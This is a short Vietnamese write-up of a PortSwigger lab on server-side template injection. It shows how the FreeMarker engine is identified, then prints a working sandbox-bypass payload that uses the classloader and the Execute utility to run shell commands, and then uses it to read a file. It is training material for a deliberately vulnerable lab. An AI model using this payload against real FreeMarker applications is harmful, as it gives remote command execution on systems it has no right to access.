# Server-side template injection in a sandboxed environment
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

## Phân tích
- Login với default user, view detail và edit template, thử với các payload
![img.png](img.png)
- Ta thấy giá trị payload ta đưa vào đã evaluated. Nghĩa là template có thể bị SSTI
- Giờ đi check template engine, ta thử với error message bằng cách đưa vào invalid value
![img_1.png](img_1.png)
- Template engine đang dùng là FreeMarker.
- Thử payload để execute code
![img_2.png](img_2.png)
- Thấy error là ko thể execute do security issue. Thử với paylaod `Sandbox bypass` từ Hacktricks
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
![img_3.png](img_3.png)
- Do `article` object ko tồn tại, ta có `product` object
![img_4.png](img_4.png)
- Check `ls` với `pwd` file cần thiết rồi `cat` giá trị
![img_5.png](img_5.png)
- Submit
![img_6.png](img_6.png)